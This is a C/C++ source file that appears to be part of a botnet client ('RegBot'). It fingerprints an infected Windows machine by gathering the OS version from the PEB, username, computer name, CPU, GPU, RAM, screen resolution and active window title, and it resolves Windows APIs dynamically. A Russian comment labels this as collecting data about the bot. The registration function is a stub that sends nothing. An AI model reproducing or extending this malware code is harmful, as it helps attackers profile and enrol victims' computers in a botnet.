#include "RegBot.h"
#include "../String/StringHelpers.h"

OsVer GetOsVer()
{
	OsVer ver;
	_PEB* pPEB = (__PEB*)__readfsdword(0x30);
	ver.dwMajor = pPEB->dwOSMajorVersion;
	ver.dwMinor = pPEB->dwOSMinorVersion;
	ver.dwBuild = pPEB->wOSBuildNumber;
	API(KERNEL32, IsWow64Process)((HANDLE)-1, &ver.isX64);
	return ver;
}

void GetUsernameW(wchar_t* userName)
{
	DWORD bufCharCount = MAX_PATH * sizeof(wchar_t);
	if (!API(ADVAPI32, GetUserNameW)(userName, &bufCharCount))
	{
		 strCpyW(userName, StaticData::unableGet);
	}
}

void GetComputernameW(wchar_t* compName)
{
	DWORD bufCharCount = MAX_PATH * sizeof(wchar_t);
	if (!API(KERNEL32, GetComputerNameW)(compName, &bufCharCount))
	{
		 strCpyW(compName, StaticData::unableGet);
	}
}

static void __cpuid(int CPUInfo[4], int InfoType)
{
	__asm
	{
		mov esi, CPUInfo
		mov eax, InfoType
		xor ecx, ecx
		cpuid
		mov dword ptr[esi + 0], eax
		mov dword ptr[esi + 4], ebx
		mov dword ptr[esi + 8], ecx
		mov dword ptr[esi + 12], edx
	}
}

void GetCpuName(wchar_t* cpuName)
{
	int CPUInfo[4];
	unsigned nExIds, i = 0;
	static char CPUBrandString[0x40];

	__cpuid(CPUInfo, 0x80000000);

	nExIds = CPUInfo[0];

	for (i = 0x80000000; i <= nExIds; ++i)
	{
		__cpuid(CPUInfo, i);

		if (i == 0x80000002)
		{
			 memCpy(CPUBrandString, CPUInfo, sizeof(CPUInfo));
		}
		else if (i == 0x80000003)
		{
			 memCpy(CPUBrandString + 16, CPUInfo, sizeof(CPUInfo));
		}
		else if (i == 0x80000004)
		{
			 memCpy(CPUBrandString + 32, CPUInfo, sizeof(CPUInfo));
		}
	}
	 ASCIIToUnicode(CPUBrandString, cpuName);
}

void GetGpuName(wchar_t* gpuName)
{
	DISPLAY_DEVICEW dd;
	dd.cb = sizeof(DISPLAY_DEVICEW);

	API(USER32, EnumDisplayDevicesW)(NULL, 0, &dd, EDD_GET_DEVICE_INTERFACE_NAME);
	 strCpyW(gpuName, dd.DeviceString);
}

DWORD GetAviableRam()
{
	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);
	if (!API(KERNEL32, GlobalMemoryStatusEx)(&statex)) return 0;

	return (statex.ullTotalPhys / 1024) / 1024;
}

void GetScreenResolution(wchar_t* screenResolution)
{
	HWND hDesktop = API(USER32, GetDesktopWindow)();
	if (!hDesktop)
	{
		 strCpyW(screenResolution, StaticData::unableGet);
	}

	RECT desktop;
	API(USER32, GetWindowRect)(hDesktop, &desktop);

	API(USER32, wsprintfW)(screenResolution, StaticData::screenResFmt, desktop.right, desktop.bottom);
}

void GetActiveWindow(wchar_t* activeWindow)
{
	HWND hwnd = API(USER32, GetForegroundWindow)();
	if (!hwnd)
	{
		 strCpyW(activeWindow, StaticData::unableGet);
		return;
	}

	if (!API(USER32, GetWindowTextW)(hwnd, activeWindow, MAX_PATH * sizeof(wchar_t)))
	{
		 strCpyW(activeWindow, StaticData::unableGet);
	}
}

BotInfo* GetBotInfo()
{
	BotInfo* botInfo = (BotInfo*) hAlloc(sizeof(BotInfo));
	if (!botInfo) return nullptr;

	botInfo->osVer = GetOsVer();
	GetUsernameW(botInfo->userName);
	GetComputernameW(botInfo->compName);
	GetCpuName(botInfo->cpuName);
	GetGpuName(botInfo->gpuName);
	botInfo->ramAmount = GetAviableRam();
	GetScreenResolution(botInfo->screenRes);
	GetActiveWindow(botInfo->activeWindow);

	return botInfo;
}

/*
	Сбор данных о боте
*/
bool RegisterBot()
{
	BotInfo* botInfo = GetBotInfo();
	return true;
}
